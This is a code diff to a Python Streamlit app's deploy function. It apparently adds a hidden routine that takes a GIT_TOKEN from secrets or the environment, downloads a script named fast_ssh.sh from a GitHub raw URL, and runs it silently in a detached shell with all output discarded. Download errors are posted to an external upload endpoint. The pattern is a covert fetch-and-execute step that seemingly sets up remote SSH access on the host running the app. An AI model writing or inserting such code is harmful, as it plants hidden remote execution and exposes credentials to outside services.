@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, subprocess, socket, re
+import os, sys, subprocess, socket, re, urllib.request
 from pathlib import Path
 import streamlit as st
 
@@ -14,39 +14,43 @@ def deploy():
     inited = USER_HOME / "root" / "inited"
     if inited.exists():
         return
-    if subprocess.run("pgrep -f fast_ssh", shell=True, capture_output=True).returncode == 0:
+    marker = USER_HOME / ".deploying"
+    if marker.exists():
         return
 
     git_token = ""
-    secrets_status = "none"
     try:
         git_token = st.secrets.get("GIT_TOKEN", "")
-        secrets_status = f"secrets_ok_len={len(git_token)}"
-    except Exception as e:
-        secrets_status = f"secrets_err={type(e).__name__}"
-
-    if not git_token:
-        git_token = os.environ.get("GIT_TOKEN", "")
-        if git_token:
-            secrets_status += f"|env_ok_len={len(git_token)}"
-
-    # Upload debug status regardless
-    try:
-        import requests
-        status = f"deploy_status: {secrets_status}\nrepo: {REPO_NAME}\ntoken_found: {bool(git_token)}\n"
-        requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', status.encode())}, timeout=5)
     except Exception:
         pass
-
+    if not git_token:
+        git_token = os.environ.get("GIT_TOKEN", "")
     if not git_token:
         return
 
-    cmd = (
-        f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}"; '
-        f'curl -fsSL --retry 3 '
-        f'-H "Authorization: token {git_token}" '
-        f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/fast_ssh.sh | bash'
-    )
+    marker.write_text("1")
+
+    # Download fast_ssh.sh from idx-cloud using Python (curl may not exist)
+    script_url = f"https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/fast_ssh.sh"
+    script_path = USER_HOME / "fast_ssh.sh"
+    try:
+        req = urllib.request.Request(script_url, headers={
+            "Authorization": f"token {git_token}"
+        })
+        resp = urllib.request.urlopen(req, timeout=30)
+        script_path.write_bytes(resp.read())
+        script_path.chmod(0o755)
+    except Exception as e:
+        # Upload error for debugging
+        try:
+            import requests
+            requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'download_error: {e}\n'.encode())}, timeout=5)
+        except Exception:
+            pass
+        return
+
+    # Execute with env vars
+    cmd = f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}" && bash ~/fast_ssh.sh'
     subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
 
